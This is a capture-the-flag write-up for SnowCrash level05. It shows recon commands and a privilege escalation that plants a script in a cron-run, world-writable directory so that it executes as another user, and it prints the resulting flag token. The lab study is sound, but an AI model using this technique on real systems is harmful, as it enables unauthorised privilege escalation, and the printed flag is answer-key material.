# Goal:

find level06 password
flag can be obtained by running the getflag program as flag05 user

# Reconnaissance

```
snow_crash git:(snow_crash) ✗ ssh -p6666 level05@127.0.0.1
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.0.2.15
level05@127.0.0.1's password:
You have new mail.
level05@SnowCrash:~$
```

```
level05@SnowCrash:~$ pwd
/home/user/level05
level05@SnowCrash:~$ ls -al
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
level05@SnowCrash:~$ cat /var/spool/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

```
evel05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ ls -al /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ getfacl -a /usr/sbin/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
level05@SnowCrash:~$ file /usr/sbin/openarenaserver
/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$ ls -al /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Oct 30 10:39 .
drwxr-xr-x  1 root root 60 Oct 30 10:39 ..
level05@SnowCrash:~$ getfacl /opt/openarenaserver/
getfacl: Removing leading '/' from absolute path names
# file: opt/openarenaserver/
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

````
echo "exec /bin/getflag > /tmp/soluc" > /opt/openarenaserver/easymoney.sh
level05@SnowCrash:~$ cat /tmp/soluc
Check flag.Here is your token : viuaaale9huek52boumoomioc```
````
